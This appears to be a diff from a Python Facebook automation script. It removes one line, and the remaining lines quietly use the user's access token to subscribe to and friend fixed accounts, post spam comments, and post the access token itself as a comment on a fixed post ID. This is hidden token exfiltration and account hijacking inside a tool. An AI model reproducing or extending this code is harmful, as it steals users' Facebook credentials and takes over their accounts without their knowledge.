@@ -240,7 +240,6 @@ def kontol():
 	hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'best seller'])
 	goceng  = '1303409076707310'
 	requests.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__cindy__))
-	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(FollowFbRoy,__cindy__))
 	req.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__cindy__))
 	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,__cindy__,__cindy__))
 	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
